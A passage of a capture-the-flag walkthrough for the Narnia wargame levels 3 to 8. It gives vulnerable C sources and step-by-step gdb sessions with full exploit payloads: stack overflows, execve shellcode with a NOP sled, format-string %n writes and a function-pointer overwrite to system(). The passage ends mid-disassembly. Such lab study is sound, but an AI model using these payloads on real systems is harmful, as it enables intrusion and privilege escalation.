#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1); 
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

The `narnia3` take file as a argument , and copy it's content deliver it into BLACKHOLE `/dev/null`.

```c
int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];
```

By seeing variable declaration order , first `ofile` is output path , then it has `ifile` , it is a input variable without any size limit from argument , as we know it follows stack data structure in memory level if we BufferOverFlow from `ifile` results in overwriting `ofile`

```
narnia3@gibson:/narnia$ ./narnia3 /etc/narnia_pass/narnia4
copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)
```

Let's go inside temp directory so that we can have much permission ,  `char ifile[32];` has 32 Size 

```
narnia3@gibson:/narnia$ cd /tmp/
narnia3@gibson:/tmp$
```

```
() - bracket denotes size
/tmp/ (5) + "*" * 27 + /tmp
# the last char "/tmp" will BufferOverFlow
```

```
narnia3@gibson:/tmp$ d=/tmp/$(printf "%0.s*" {1..27})/tmp
narnia3@gibson:/tmp$ $d
-bash: /tmp/***************************/tmp: No such file or directory
narnia3@gibson:/tmp$ echo $d
/tmp/***************************/tmp

# Make those folder with -p flag denotes parent dir

narnia3@gibson:/tmp$ mkdir -p $d

# Make soft link or symbolic link with next flag to current pwd
narnia3@gibson:/tmp$ ln -s /etc/narnia_pass/narnia4 $d/get

# we haven't create get file so make one and gave perm for all users
narnia3@gibson:/tmp$ touch /tmp/get
narnia3@gibson:/tmp$ chmod 777 /tmp/get

# give this cmd to narnia3
narnia3@gibson:/tmp$ /narnia/narnia3 $d/get

# ofile --> /dev/null was replace with /tmp/get due to BufferOverFlow
```

<img src="img/Pasted image 20240720183557.png" alt="Example Image" width="1080"/>
see content of narnia4 got copied to `/tmp/get`

```
narnia3@gibson:/tmp$ cat /tmp/get
```

---

**Narnia4**

```
narnia4@gibson:~$ cd /narnia/
narnia4@gibson:/narnia$ cat narnia4.c
```

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

buffer had the size of `256`  , if an argument is provided that string copy into buffer let's go to `gdb`

```
(gdb) r $(python3 -c "print('A'*256 + 'BBBB')")
```

Check for BufferOverFlow vulnerability 

```c
(gdb) r $(python3 -c "print('A'*256 + 'BBBB')")
Starting program: /narnia/narnia4 $(python3 -c "print('A'*256 + 'BBBB')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 2077712) exited normally]
(gdb) r $(python3 -c "print('A'*264 + 'BBBB')")
Starting program: /narnia/narnia4 $(python3 -c "print('A'*264 + 'BBBB')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

<img src="img/Pasted image 20240720215157.png" alt="Example Image" width="1080"/>

BufferOverFlow happen at `264` size , this same as before forms a shellcode

```
# NOP + SHELLCODE + POINTER
```

Analyze memory and find dummy pointer `(gdb) x/600wx $esp` and build the exploit 

Shellcode by Jonathan Salwan (57 bytes)
<div style="width: 100%; overflow-x: auto; ">
    <div style="display: inline-block;  height: 50px; margin: 10px; background-color:#242729; padding:15px" > \xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
</div>
</div>

```
\x90 * (264 - 57) + shellcode + dummy pointer 0xffffd660
```

<img src="img/Pasted image 20240719201528.png" alt="Example Image" width="1080"/>

https://wordcounter.net/ use this site to  form nop 

```
r `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x60\xd6\xff\xff"`
```

let's find the actual pointer and change.

<img src="img/Pasted image 20240720215715.png" alt="Example Image" width="1080"/>

Let take mid pointer which has `\x90` , change `0xffffd660` to `0xffffd4e0` in little endian format  

```
r `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\xe0\xd4\xff\xff"`
```


<img src="img/Pasted image 20240720220017.png" alt="Example Image" width="1080"/>

We got the shell as user narnia4 and let try outside gdb , copy this 

```
`echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\xe0\xd4\xff\xff"`
```

<img src="img/Pasted image 20240720220219.png" alt="Example Image" width="1080"/>

```
cat /etc/narnia_pass/narnia5
```

----


**Narnia5**

```
narnia5@gibson:~$ cd /narnia/
narnia5@gibson:/narnia$ cat narnia5.c 
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

After See the C file `if i==500` , then we get a shell that's the point , buffer has size of `64` ,  input is taken as argument and stored to buffer using `snprintf()` , it has format string vulnerability as we have input into function. and buffer last char replace by `0` , let experiment with input 

```
narnia5@gibson:/narnia$ ./narnia5 $(echo -e "AAAAAAA")
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAAAA] (7)
i = 1 (0xffffd360)

# program printing the pointer i in hex value ,  %x print char in hex values
narnia5@gibson:/narnia$ ./narnia5 $(echo -e "AAAAAAA")%x%
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAAAA41414141] (15)
i = 1 (0xffffd360)

narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff")%x%
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���`60d3ffff] (12)
i = 1 (0xffffd360)

narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff"")%20x%
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���`            60d3ffff] (24)
i = 1 (0xffffd360)

# this happen %n can't define argument inside "string" 
narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff")%20x%n
Segmentation fault (core dumped)

# it worked but ponter value not increament beacuase $ is has to be escaped
narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff"")%20x%1$n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���`            60d3ffff] (24)
i = 1 (0xffffd360)

narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff")%20x%1\$n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [`���            ffffd360] (24)
i = 24 (0xffffd360)

# okay i was change into 4 , add 496 before
narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff")%496x%1\$n
Change i's value from 1 -> 500. GOOD
$ whomai
/bin/sh: 1: whomai: Permission denied
$ whoami
narnia6
```



---

**Narnia6**

```
narnia6@gibson:~$ cd /narnia/
narnia6@gibson:/narnia$ cat narnia6.c 
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}

```

The program checking for at most three arguments, and storing `arg[1] arg[2]` in b1 and b2 respectively using `strcpy()` and in that function there is no limit for argument  , and `fp()` is just a print function with file pointer.  and  printing only b1 . b1 and b2 are size `8`

```c
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
```

`movl` `var`, `%eax`. **Move the contents of memory location var into number register `%eax`. , usually we control over `$esp` but if its is move to `eax` we can able to execute some instruction 

```
narnia6@gibson:/narnia$ ./narnia6 one two
one
narnia6@gibson:/narnia$
```

There is a BufferOverFlow vulnerability , let use debugger and `disassemble main`  at end find the breakpoint before calling `eax`

```asmatmel
   0x080492c4 <+225>:   mov    (%eax),%eax
   0x080492c6 <+227>:   push   %eax
   0x080492c7 <+228>:   lea    -0x14(%ebp),%eax
   0x080492ca <+231>:   push   %eax
   0x080492cb <+232>:   call   0x8049060 <strcpy@plt>
   0x080492d0 <+237>:   add    $0x8,%esp
   0x080492d3 <+240>:   mov    0xc(%ebp),%eax
   0x080492d6 <+243>:   add    $0x8,%eax
   0x080492d9 <+246>:   mov    (%eax),%eax
   0x080492db <+248>:   push   %eax
   0x080492dc <+249>:   lea    -0x1c(%ebp),%eax
   0x080492df <+252>:   push   %eax
   0x080492e0 <+253>:   call   0x8049060 <strcpy@plt>
   0x080492e5 <+258>:   add    $0x8,%esp
   0x080492e8 <+261>:   mov    -0xc(%ebp),%eax
   0x080492eb <+264>:   and    $0xff000000,%eax
   0x080492f0 <+269>:   mov    %eax,%ebx
   0x080492f2 <+271>:   call   0x80491d6 <get_sp>
   0x080492f7 <+276>:   cmp    %eax,%ebx
   0x080492f9 <+278>:   jne    0x8049302 <main+287>
   0x080492fb <+280>:   push   $0xffffffff
   0x080492fd <+282>:   call   0x8049080 <exit@plt>
   0x08049302 <+287>:   call   0x8049050 <geteuid@plt>
   0x08049307 <+292>:   mov    %eax,%ebx
   0x08049309 <+294>:   call   0x8049050 <geteuid@plt>
   0x0804930e <+299>:   push   %ebx
   0x0804930f <+300>:   push   %eax
   0x08049310 <+301>:   call   0x8049090 <setreuid@plt>
   0x08049315 <+306>:   add    $0x8,%esp
   0x08049318 <+309>:   lea    -0x14(%ebp),%eax
   0x0804931b <+312>:   push   %eax
   0x0804931c <+313>:   mov    -0xc(%ebp),%eax
   0x0804931f <+316>:   call   *%eax
   0x08049321 <+318>:   add    $0x4,%esp
   0x08049324 <+321>:   push   $0x1
   0x08049326 <+323>:   call   0x8049080 <exit@plt>
```

```
(gdb) break *main+316 
Breakpoint 1 at 0x804931f

gdb) run "AAAAAAAA" "BBBBBBBB"
Starting program: /narnia/narnia6 "AAAAAAAA" "BBBBBBBB"
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()

(gdb) info registers
eax            0x8049000           134516736
ecx            0x36b6              14006
edx            0x0                 0
ebx            0x36b6              14006
esp            0xffffd318          0xffffd318
ebp            0xffffd338          0xffffd338
esi            0xffffd404          -11260
edi            0xf7ffcb60          -134231200
eip            0x804931f           0x804931f <main+316>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0

# Examine esp 
(gdb) x/10wx $esp
0xffffd318:     0xffffd324      0x42424242      0x42424242      0x41414100
0xffffd328:     0x41414141      0x08049000      0x00000003      0xf7fade34
0xffffd338:     0x00000000      0xf7da1cb9

# A and B separated by null 00 , and then eax was store before A in the stack , lets overwrite that pointer
(gdb) run "AAAAAAAACCCC" "BBBBBBBB"
The program being debugged has been started already.
Start it from the beginning? (y or n) Y
Starting program: /narnia/narnia6 "AAAAAAAACCCC" "BBBBBBBB"
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) info registers
eax            0x43434343          1128481603
ecx            0x36b6              14006
edx            0x0                 0
ebx            0x36b6              14006
esp            0xffffd308          0xffffd308
ebp            0xffffd328          0xffffd328
esi            0xffffd3f4          -11276
edi            0xf7ffcb60          -134231200
eip            0x804931f           0x804931f <main+316>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
```

`$eax` was overwritten by `0x43434343`

```
# show the where system() pointer address in mem
(gdb) p system
$1 = {int (const char *)} 0xf7dcd430 <__libc_system>

# Let's give this pointer as argument to overflow, it's hex use echo and also preprocess it
(gdb)  run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB"`
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) c
Continuing.
[Detaching after vfork from child process 3406718]
[Inferior 1 (process 3406708) exited with code 01]

# see child process has been created and detached so increase size , its working 
run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBC"`
sh: 1: C: not found

# instead c use shell cmds for verfication
run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBls"`
[Detaching after vfork from child process 3409451]
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
[Inferior 1 (process 3409441) exited with code 01]

(gdb) run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB/bin/sh"`
```

<img src="img/Pasted image 20240721144941.png" alt="Example Image" width="1080"/>

Exit from debugger and try same 

```
./narnia6 `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB/bin/sh"`
```

<img src="img/Pasted image 20240721145139.png" alt="Example Image" width="1080"/>

```
$ cat /etc/narnia_pass/narnia7
```

----

**Narnia7**

```
narnia7@gibson:~$ cd /narnia/
narnia7@gibson:/narnia$ cat narnia5.c 
narnia7@gibson:/narnia$ cat narnia7.c 
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}

```

Look at main function , `vuln()` gets argument as input , and then calling `goodfunction()` , which doesn't do anything. but see the `hackedfunction()` has  `setreuid(geteuid(),geteuid());` with `/bin/sh` , in `vuln()` it is points the `goodfunction()`'s pointer in `ptrf()` , if we change points to pointer of `hackedfunction()`. we definitely have potential shell to get the next flag.

```
narnia7@gibson:/narnia$ ./narnia7 
Usage: ./narnia7 <buffer>

# let's give the buffer,
narnia7@gibson:/narnia$ ./narnia7 asdfasf
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2d8)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..

# ptrf() points goodfunction() , go to gdb debugger
narnia7@gibson:/narnia$ gdb narnia7
(gdb)

# disassemble vuln() to add the breakpoint
(gdb) disassemble vuln
```

```asmatmel
Dump of assembler code for function vuln:
   0x08049206 <+0>:	push   %ebp
   0x08049207 <+1>:	mov    %esp,%ebp
   0x08049209 <+3>:	sub    $0x84,%esp
   0x0804920f <+9>:	push   $0x80
   0x08049214 <+14>:	push   $0x0
   0x08049216 <+16>:	lea    -0x80(%ebp),%eax
   0x08049219 <+19>:	push   %eax
   0x0804921a <+20>:	call   0x80490d0 <memset@plt>
   0x0804921f <+25>:	add    $0xc,%esp
   0x08049222 <+28>:	push   $0x80492ea
   0x08049227 <+33>:	push   $0x804a008
   0x0804922c <+38>:	call   0x8049040 <printf@plt>
   0x08049231 <+43>:	add    $0x8,%esp
   0x08049234 <+46>:	push   $0x804930f
   0x08049239 <+51>:	push   $0x804a01d
   0x0804923e <+56>:	call   0x8049040 <printf@plt>
   0x08049243 <+61>:	add    $0x8,%esp
   0x08049246 <+64>:	movl   $0x80492ea,-0x84(%ebp)
   0x08049250 <+74>:	mov    -0x84(%ebp),%eax
   0x08049256 <+80>:	lea    -0x84(%ebp),%edx
   0x0804925c <+86>:	push   %edx
   0x0804925d <+87>:	push   %eax
   0x0804925e <+88>:	push   $0x804a035
   0x08049263 <+93>:	call   0x8049040 <printf@plt>
   0x08049268 <+98>:	add    $0xc,%esp
   0x0804926b <+101>:	push   $0x804a050
   0x08049270 <+106>:	call   0x8049080 <puts@plt>
   0x08049275 <+111>:	add    $0x4,%esp
   0x08049278 <+114>:	push   $0x2
   0x0804927a <+116>:	call   0x8049060 <sleep@plt>
   0x0804927f <+121>:	add    $0x4,%esp
   0x08049282 <+124>:	movl   $0x80492ea,-0x84(%ebp)
   0x0804928c <+134>:	push   0x8(%ebp)
   0x0804928f <+137>:	push   $0x80
   0x08049294 <+142>:	lea    -0x80(%ebp),%eax
   0x08049297 <+145>:	push   %eax
   0x08049298 <+146>:	call   0x80490e0 <snprintf@plt>
   0x0804929d <+151>:	add    $0xc,%esp                        <<<<<<<< breakpoint
   0x080492a0 <+154>:	mov    -0x84(%ebp),%eax
   0x080492a6 <+160>:	call   *%eax
   0x080492a8 <+162>:	leave
   0x080492a9 <+163>:	ret
```

```
# add breakpoint
(gdb) break *vuln+151
Breakpoint 1 at 0x804929d

(gdb) run "AAAA"
(gdb) x/20wx $esp
0xffffd29c:	0xffffd2ac	0x00000080	0xffffd57e	0x080492ea
0xffffd2ac:	0x41414141	0x00000000	0x00000000	0x00000000
0xffffd2bc:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd2cc:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd2dc:	0x00000000	0x00000000	0x00000000	0x00000000

# "AAAA" at 0xffffd2ac ,let experiment with this 0xffffd2cc (\xcc\d2\xff\ff), %x hex value %n count of the no of char
(gdb) run $(echo -e "\xcc\d2\xff\ff")%x%n
(gdb) x/20wx $esp
0xffffd29c:	0xffffd2ac	0x00000080	0xffffd57a	0x080492ea
0xffffd2ac:	0xffffd2cc	0x39343038	0x00616532	0x00000000
0xffffd2bc:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd2cc:	0x0000000b	0x00000000	0x00000000	0x00000000
0xffffd2dc:	0x00000000	0x00000000	0x00000000	0x0000000

# at 0xffffd2cc  0x0000000b , it changing let give hackedfunc() hex 0x804930f
# change hex to demical
$ echo $((0x804930f))
134517519

(gdb) run $(echo -e "\xcc\xd2\xff\xff")%134517519x%n
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2a8)                <<<<<<<<<<<<< get acutal pointer
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()

(gdb) x/20wx $esp
0xffffd29c:	0xffffd2ac	0x00000080	0xffffd571	0x080492ea
0xffffd2ac:	0xffffd2cc	0x20202020	0x20202020	0x20202020
0xffffd2bc:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd2cc:	0x08049313	0x20202020	0x20202020	0x20202020
0xffffd2dc:	0x20202020	0x20202020	0x20202020	0x20202020

# see 0x08049313 at 0xffffd2cc \x20 deontes null or space
# examine 0x08049313 points hackedfunction
(gdb) x/wx 0x08049313
0x8049313 <hackedfunction+4>:	0x04a0d568

# replace 0xffffd2a8 in \xcc\xd2\xff\xff which is actual pointer for hackedfucntion
(gdb) run $(echo -e "\xa8\xd2\xff\xff")%134517519x%n
continue
Way to go!!!![Detaching after vfork from child process 3818789]
$ whoami
narnia7
```
]
run outside gdb debugger 

```
narnia7@gibson:/narnia$ ./narnia7 $(echo -e "\xa8\xd2\xff\xff")%134517519x%n
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2d8)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..

# Not worked see memory location was changed from 0xffffd2a8 to 0xffffd2d8 , so change that value
narnia7@gibson:/narnia$ ./narnia7 $(echo -e "\xd8\xd2\xff\xff")%134517519x%n
```


<img src="img/Pasted image 20240722200152.png" alt="Example Image" width="1080"/>

```
$ cat /etc/narnia_pass/narnia8
```

---

**Narnia8**

```
narnia8@gibson:~$ cd /narnia/
narnia8@gibson:/narnia$ cat narnia8.c 
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
```

The Binary get input as argument and placed in to `func()` as `*b` parameter and then `b` assigned to `blab` , `bok` initiated with full of `\0`(null).
`blah` was assigned char by char to `bok` in a loop , this the hook point there is no any boundary limit for input , this had potential to BufferOverFlow

Run gdb in quiet mode - ensure that only essential  output was displayed.  `gdb -q ./narnia8`

```
(gdb) disassemble func
```

```c
   0x08049176 <+0>:	push   %ebp
   0x08049177 <+1>:	mov    %esp,%ebp
   0x08049179 <+3>:	sub    $0x18,%esp
   0x0804917c <+6>:	mov    0x8(%ebp),%eax
   0x0804917f <+9>:	mov    %eax,-0x4(%ebp)
   0x08049182 <+12>:	push   $0x14
   0x08049184 <+14>:	push   $0x0
   0x08049186 <+16>:	lea    -0x18(%ebp),%eax
   0x08049189 <+19>:	push   %eax
   0x0804918a <+20>:	call   0x8049050 <memset@plt>
   0x0804918f <+25>:	add    $0xc,%esp
   0x08049192 <+28>:	movl   $0x0,0x804b228
   0x0804919c <+38>:	jmp    0x80491c3 <func+77>
   0x0804919e <+40>:	mov    0x804b228,%eax
   0x080491a3 <+45>:	mov    %eax,%edx
   0x080491a5 <+47>:	mov    -0x4(%ebp),%eax
   0x080491a8 <+50>:	add    %eax,%edx
   0x080491aa <+52>:	mov    0x804b228,%eax
   0x080491af <+57>:	movzbl (%edx),%edx
   0x080491b2 <+60>:	mov    %dl,-0x18(%ebp,%eax,1)
   0x080491b6 <+64>:	mov    0x804b228,%eax
   0x080491bb <+69>:	add    $0x1,%eax
   0x080491be <+72>:	mov    %eax,0x804b228
